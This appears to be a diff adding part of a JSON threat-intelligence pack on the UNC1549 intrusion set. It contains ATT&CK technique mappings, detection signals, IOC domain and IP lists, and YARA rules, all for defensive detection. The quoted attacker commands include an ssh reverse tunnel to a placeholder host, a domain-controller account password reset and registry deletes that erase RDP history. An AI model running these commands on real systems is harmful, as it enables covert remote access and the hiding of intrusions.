+      "observed_tooling": ["SIGHTGRAB (C screenshot utility; XOR 0x41; periodic capture)"],
+      "detection_feasibility": "high — periodic creation of timestamped image files under Users\\Public\\Videos|Music by a non-standard process is a specific, high-fidelity file-creation detection",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1071.001",
+      "technique_name": "Application Layer Protocol: Web Protocols",
+      "tactic": "command-and-control",
+      "procedure_description": "Backdoors beacon over HTTPS web protocols to Azure App Service (azurewebsites.net) and Azure VM (cloudapp.azure.com) C2; POLLBLEND registers via HTTP POST JSON {\"username\":\"<computer_name>\"} to /register/, and LIGHTRAIL uses a hardcoded /news path and a fixed Chrome/Edge User-Agent.",
+      "observed_tooling": ["Microsoft Azure App Service (azurewebsites.net) and Azure VMs (cloudapp.azure.com) for C2", "POLLBLEND (C++ Windows tunneler; HTTP POST JSON registration; hardcoded servers; code-signed)"],
+      "detection_feasibility": "medium — HTTPS beaconing to Azure blends with normal cloud traffic, but the hardcoded /news URI, /register/ endpoint, static User-Agent and JSON registration body are detectable via proxy/TLS-metadata and web-log analytics when combined with the actor domain list",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1573",
+      "technique_name": "Encrypted Channel",
+      "tactic": "command-and-control",
+      "procedure_description": "TWOSTROKE communicates over SSL-encrypted TCP/443; LIGHTRAIL uses Azure WebSocket over HTTPS/443. Encrypted channels conceal C2 content.",
+      "observed_tooling": ["TWOSTROKE (C++ backdoor; SSL-encrypted TCP/443; DLL search-order hijack persistence; code-signed)", "LIGHTRAIL (Windows Golang tunneler; modified Lastenzug Socks4a proxy; Azure WebSocket C2; VGAuthCLI.exe/VGAuth.dll side-load)"],
+      "detection_feasibility": "low — TLS on 443 to Azure is ubiquitous and content is opaque; hunt-leaning via TLS-fingerprint (JA3/JA3S), beacon-periodicity and destination-reputation analytics rather than payload inspection",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1090",
+      "technique_name": "Proxy",
+      "tactic": "command-and-control",
+      "procedure_description": "Custom tunnelers LIGHTRAIL (modified Lastenzug Socks4a proxy, MAX_CONNECTIONS raised to 5000), GHOSTLINE (go-yamux) and POLLBLEND proxy/relay traffic through Azure endpoints to obscure the true C2 source.",
+      "observed_tooling": ["LIGHTRAIL (Windows Golang tunneler; modified Lastenzug Socks4a proxy; Azure WebSocket C2; VGAuthCLI.exe/VGAuth.dll side-load)", "GHOSTLINE (Windows Golang tunneler; go-yamux; hardcoded C2; code-signed)", "POLLBLEND (C++ Windows tunneler; HTTP POST JSON registration; hardcoded servers; code-signed)"],
+      "detection_feasibility": "medium — tunneler processes side-loaded via legitimate binaries plus outbound proxy connections to Azure are detectable via process-execution and network telemetry when correlated with the DLL-hijack host and actor domains",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1572",
+      "technique_name": "Protocol Tunneling",
+      "tactic": "command-and-control",
+      "procedure_description": "Actors establish OpenSSH reverse tunnels for resilient, low-forensic-footprint C2: 'ssh.exe [User]@[IP] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070'; they also use ZeroTier and ngrok tunnels post-remediation.",
+      "observed_tooling": ["OpenSSH (ssh.exe) reverse tunnels over port 443", "ZeroTier", "ngrok"],
+      "detection_feasibility": "high — Windows ssh.exe launched with reverse-tunnel flags (-R) to port 443 and StrictHostKeyChecking=no is an anomalous, high-fidelity command-line/process detection on Windows endpoints, corroborated by outbound 443 to the tunnel IPs",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "procedure_description": "Backdoors (MINIBIKE, TWOSTROKE, DEEPROOT) support downloading files/tools from C2 to the victim host as part of their command sets, staging additional utilities post-compromise.",
+      "observed_tooling": ["MINIBIKE (C++ backdoor; Azure Web Apps C2; file exfil/upload and command execution)", "TWOSTROKE (C++ backdoor; SSL-encrypted TCP/443; DLL search-order hijack persistence; code-signed)"],
+      "detection_feasibility": "medium — file writes following backdoor C2 activity are detectable via process+file telemetry and download-provenance, but the encrypted Azure channel obscures the transfer itself",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    },
+    {
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "exfiltration",
+      "procedure_description": "Backdoors exfiltrate collected files (documents, screenshots, credential output) over their Azure-hosted C2 channels — MINIBIKE/TWOSTROKE/DEEPROOT all implement file-upload-to-C2 commands.",
+      "observed_tooling": ["MINIBIKE (C++ backdoor; Azure Web Apps C2; file exfil/upload and command execution)", "DEEPROOT (Linux Golang backdoor; multiple redundant Azure C2 domains; hex-encoded '-===-' delimited payloads)"],
+      "detection_feasibility": "low — exfiltration rides the same encrypted Azure C2 as beaconing and blends with normal cloud egress; hunt-leaning via volumetric/egress-anomaly analytics tied to the actor domains",
+      "sources": ["https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"]
+    }
+  ],
+  "detection_signals": [
+    "DLL search-order hijacking: a legitimate signed binary loading an unexpected DLL from a writable/non-standard path — notably VGAuthCLI.exe loading a malicious VGAuth.dll, and files (VGAuth.dll, LOG.txt, crash.log, config.txt) planted under C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\ (Sysmon EID 7 + file-integrity monitoring of VMware/Citrix/Fortinet/NVIDIA/Microsoft software dirs)",
+    "DCSync from a non-DC principal: DRSUAPI DsGetNCChanges / Event ID 4662 replication access from an unexpected account, and DCSYNCER.SLICK output at C:\\users\\public\\LOG.txt or the VMware VGAuth LOG.txt; unconventional DC machine-account password reset 'net user DC-01$ P@ssw0rd'",
+    "Windows ssh.exe reverse tunnel: command line containing '-R' with '-p 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N' to an external IP",
+    "Deletion of RDP history: 'reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default /va /f' and '...\\Terminal Server Client\\Servers /f'",
+    "SIGHTGRAB screenshots: periodic timestamped .jpg files under C:\\Users\\Public\\Videos\\YYYY-MM-DD-HH-MM\\ and C:\\Users\\Public\\Music\\... (XOR 0x41 encrypted)",
+    "CRASHPAD browser-credential theft: CryptUnprotectData use with explorer.exe impersonation writing crash.log/config.txt to the VMware VGAuth directory",
+    "Kerberoasting bursts (Event ID 4769, RC4, many SPNs) from obfuscated Invoke-Kerberoast; password-spray fan-out (Event ID 4625 / Azure AD sign-in logs)",
+    "Beaconing to actor Azure C2: *.azurewebsites.net and *.cloudapp.azure.com hosts from the IOC list; POLLBLEND HTTP POST {\"username\":\"<computer_name>\"} to /register/; LIGHTRAIL requests to hardcoded /news path with fixed Chrome/42.0.2311.135 ... Edge/12.10136 User-Agent",
+    "Unsanctioned remote tools: Atelier Web Remote Commander (AWRC), ZeroTier, ngrok process execution and outbound connections; SCCM Remote Control (CmRcService) VNC-like sessions bypassing user consent",
+    "RDP session hijacking (Event IDs 4778/4779, SYSTEM-context tscon); PowerShell Remoting (wsmprovhost.exe) to internal hosts",
+    "Spearphishing links to newly-registered look-alike domains (usa-careers, airplaneserviceticketings, airtravellog) and fake login pages; third-party vendor account logons breaking out of Citrix/VMware/AVD sessions",
+    "Code-signed backdoors (TWOSTROKE/GHOSTLINE/POLLBLEND) — match/revoke reported certificate thumbprints; every post-exploitation payload has a unique hash (favor YARA/behavior over hash IOCs)"
+  ],
+  "iocs": {
+    "ips": [
+      "104.194.215.88",
+      "13.60.50.172",
+      "167.172.137.208",
+      "34.18.42.26",
+      "4.188.75.206",
+      "4.240.113.27",
+      "40.119.176.233"
+    ],
+    "domains": [
+      "airbus.usa-careers.com",
+      "airplaneserviceticketings.com",
+      "airtravellog.com",
+      "automationagencybusiness.com",
+      "fdtsprobusinesssolutions.com",
+      "forcecodestore.com",
+      "tini-ventures.com",
+      "thetacticstore.com",
+      "politicalanorak.com",
+      "vcs-news.com",
+      "ac-connection-status105.azurewebsites.net",
+      "acc-cloud-connection.azurewebsites.net",
+      "active-az-check-status45.azurewebsites.net",
+      "active-az-check-status675.azurewebsites.net",
+      "active-az-status45.azurewebsites.net",
+      "active-az-status795.azurewebsites.net",
+      "active-internal-log65.azurewebsites.net",
+      "active-internal-logs.azurewebsites.net",
+      "active-intranet-logs.azurewebsites.net",
+      "connect-acc-492.azurewebsites.net",
+      "connect-acl-492.azurewebsites.net",
+      "infrasync-ac372.azurewebsites.net",
+      "intra-az-check-status45.azurewebsites.net",
+      "intra-az-check-status675.azurewebsites.net",
+      "intra-az-status45.azurewebsites.net",
+      "intra-az-status795.azurewebsites.net",
+      "mso-internal-log65.azurewebsites.net",
+      "mso-internal-logs.azurewebsites.net",
+      "mso-intranet-logs.azurewebsites.net",
+      "nx425-win4945.azurewebsites.net",
+      "nx4542-win4957.azurewebsites.net",
+      "nxlog-crash-1567.azurewebsites.net",
+      "nxlog-win-1567.azurewebsites.net",
+      "nxversion-win-1567.azurewebsites.net",
+      "nxversion-win32-1127.azurewebsites.net",
+      "snare-core.azurewebsites.net",
+      "vcphone-ms.azurewebsites.net",
+      "vm-ticket-svc.azurewebsites.net",
+      "vm-tools-svc.azurewebsites.net",
+      "vmware-health-ms.azurewebsites.net",
+      "automationagencybusiness.azurewebsites.net",
+      "developercodepro.azurewebsites.net",
+      "developercodevista.azurewebsites.net",
+      "dreamtiniventures.azurewebsites.net",
+      "fdtsprobusinesssolutions.azurewebsites.net",
+      "masterflexiblecloud.azurewebsites.net",
+      "storagewiz.co.azurewebsites.net",
+      "swifttiniventures.azurewebsites.net",
+      "thecloudappbox.azurewebsites.net",
+      "browsercheckap.azurewebsites.net",
+      "queuetestapplication.azurewebsites.net",
+      "skyticketgrant.azurewebsites.net",
+      "codesparkle.eastus.cloudapp.azure.com",
+      "fdtsprobusinesssolutions.eastus.cloudapp.azure.com",
+      "fdtsprobusinesssolutions.northeurope.cloudapp.azure.com",
+      "storageboxcloud.northeurope.cloudapp.azure.com",
+      "swiftcode.eastus.cloudapp.azure.com",
+      "terratechworld.eastus.cloudapp.azure.com",
+      "thestorageboxcloud.northeurope.cloudapp.azure.com",
+      "thevaultapp.westus3.cloudapp.azure.com",
+      "thevaultspace.eastus.cloudapp.azure.com",
+      "customerlistchange.eastus.cloudapp.azure.com",
+      "airlinecontrolsite.uaenorth.cloudapp.azure.com",
+      "airlinecontrolsite.westus3.cloudapp.azure.com",
+      "airseatregister.eastus.cloudapp.azure.com",
+      "airseatsregister.qatarcentral.cloudapp.azure.com",
+      "airseatsregistering.qatarcentral.cloudapp.azure.com",
+      "mydocs.qatarcentral.cloudapp.azure.com",
+      "hserbhh43.westus3.cloudapp.azure.com",
+      "overqatfa.northeurope.cloudapp.azure.com"
+    ],
+    "emails": [],
+    "hashes": [
+      "10f16991665df69d1ccd5187e027cf3d",
+      "b2bd275f97cb95c7399065b57f90bb6c",
+      "b19bdfda0cd8e50f7b5968d39aa31449a9cf9b85b8d7e00e19400cf5734f70bf"
+    ],
+    "cves": []
+  },
+  "yara_rules": [
+    "import \"pe\"\n\nrule M_APT_Utility_DCSYNCER_SLICK_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\t\tmd5 = \"10f16991665df69d1ccd5187e027cf3d\"\n\tstrings:\n\t\t$ = { 48 89 84 24 ?? 01 00 00 C7 84 24 ?? 01 00 00 30 80 28 00 C7 84 24 ?? 01 00 00 E8 03 00 00 48 C7 84 24 ?? 01 00 00 00 00 A0 00 BA ?? 00 00 00 8D 4A ?? FF 15 ?? ?? 01 00 48 89 84 24 ?? 01 00 00 C7 00 01 00 00 00 48 8B 84 24 ?? 01 00 00 44 89 ?? 04 48 8B 84 24 ?? 01 00 00 C7 40 08 ?? 00 00 00 41 8B ?? }\n\t\t$ = \"\\\\LOG.txt\" ascii wide\n\t\t$ = \"%ws_%d:%d:\" ascii wide fullword\n\t\t$ = \"%ws:%d:\" ascii wide fullword\n\t\t$ = \"::::\" ascii wide fullword\n\t\t$ = \"%ws_%d:%d::\" ascii wide fullword\n\t\t$ = \"%ws:%d::\" ascii wide fullword\n\tcondition:\n\t\tpe.is_pe and all of them\n}",
+    "import \"pe\"\n\nrule M_APT_Utility_CRASHPAD_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\t\tmd5 = \"b2bd275f97cb95c7399065b57f90bb6c\"\n\tstrings:\n\t\t$ = \"[-] Loo ror: %u\" ascii fullword\n\t\t$ = \"[-] Adj r: %u\" ascii fullword\n\t\t$ = \"[-] Th ge. \" ascii fullword\n\t\t$ = \"[+] O s!\" ascii fullword\n\t\t$ = \"[-] O C: %i\" ascii fullword\n\t\t$ = \"[-] O E: %i\" ascii fullword\n\t\t$ = \"[+] Op cess!\" ascii fullword\n\t\t$ = \"[-] Op Code: %i\" ascii fullword\n\t\t$ = \"[-] O Error: %i\" ascii fullword\n\t\t$ = \"[+] Im su!\" ascii fullword\n\t\t$ = \"[+] R\" ascii fullword\n\t\t$ = \"[-] Impe Code: %i\" ascii fullword\n\t\t$ = \"[-] Imo: %i\" ascii fullword\n\t\t$ = \"[+] Du success!\" ascii fullword\n\t\t$ = \"[-] Du Code: %i\" ascii fullword\n\t\t$ = \"[-] Du Error: %i\" ascii fullword\n\t\t$ = \"[+] Dec Suc.\" ascii fullword\n\t\t$ = \"%02X\" ascii fullword\n\t\t$ = \"Decryption failed\" ascii fullword\n\t\t$ = \"config.txt\"\n\t\t$ = \"crash.log\"\n\t\t$ = \"[+] e wt!\" ascii fullword\n\t\t$ = \"[+] p %d!\" ascii fullword\n\t\t$ = \"[+] e!\" ascii fullword\n\tcondition:\n\t\tpe.is_pe and 15 of them\n}"
+  ],
+  "confidence": "high",
+  "notes": "Primary sources are two Mandiant/Google Threat Intelligence Group technical reports with concrete IOC/YARA appendices: the Feb 2024 'When Cats Fly' blog (MINIBIKE/MINIBUS, fake-recruitment spearphishing sites, Azure C2, DLL side-loading) and the 2024-2025 GTIG 'Frontline Intelligence' analysis (expanded toolset, third-party access, DCSync/credential access, tunnelers). Evidence confidence is HIGH (primary vendor research + technical IOCs + YARA). ATTRIBUTION confidence is MEDIUM and deliberately hedged: Mandiant tracks the cluster as the uncategorized group UNC1549 with only medium-confidence Iran-nexus alignment and TTP/victimology OVERLAP with Smoke Sandstorm and the IRGC-affiliated Crimson Sandstorm/Tortoiseshell ecosystem; Proofpoint tracks a substantially overlapping cluster as TA455. These overlaps are convergence indicators, not a confirmed single-operator identity, and attribution adjudication is out of scope for Stage 1. actor.mitre_id left empty per tasking (UNC1549 has no public MITRE Gxxxx group id; aliases carried in aliases[]). ATT&CK normalizations applied for THIS environment's bundled dataset and verified present in attack_dump.json: Defense Evasion techniques use tactic slug 'stealth'; indicator-removal/registry-clear use tactic 'defense-impairment' (T1070.004, T1112); DLL search-order hijacking uses T1574.001 (T1574.002 absent); encrypted/encoded file uses T1027.013. Every technique_id was validated against attack_dump.json before inclusion — zero invalid IDs. STRONGEST DETECTION SURFACE (detect-candidate, high feasibility): T1574.001 VGAuthCLI.exe->VGAuth.dll side-load in VMware dirs, T1003.006 DCSync/DCSYNCER.SLICK, T1572 ssh.exe reverse tunnels (-R -p443), T1112 RDP-history reg delete, T1113 SIGHTGRAB screenshots, T1555.003 CRASHPAD, T1558.003 Kerberoasting, T1110.003 password spray, T1563.002 RDP hijacking, T1219 AWRC/ZeroTier/ngrok. HUNT-leaning (low feasibility, off-victim / cloud-blended): T1583.006 Azure C2 acquisition, T1573/T1071.001 encrypted HTTPS beaconing to Azure (blends with legitimate cloud), T1041 exfil over C2, T1593.001 social-media recruiting recon, T1587.001/T1588.003 capability & cert development, T1041 Azure-channel exfil — these route to hunting/intel rather than crisp detections. IOCs are verbatim from the GTIG report appendix; only actor-specific Azure subdomains (per-app *.azurewebsites.net and per-VM *.cloudapp.azure.com) and actor-registered domains are included — generic legitimate Azure service endpoints were intentionally excluded. Hashes: DCSYNCER.SLICK MD5 10f16991665df69d1ccd5187e027cf3d and CRASHPAD MD5 b2bd275f97cb95c7399065b57f90bb6c are clean sample hashes; the LIGHTRAIL SHA256 b19bdfda... was noted by GTIG as a VirusTotal upload modified by the uploader (kept for reference but low-value as an IOC). No CVEs: this actor's initial access is social-engineering/valid-account/third-party based rather than public-facing exploit-CVE based, so the cves array is intentionally empty. Note per spec: every post-exploitation payload is compiled with a unique hash to defeat hash matching — prioritize the behavioral TTPs, YARA rules, and infrastructure IOCs over sample-hash IOCs when operationalizing this pack."
+}
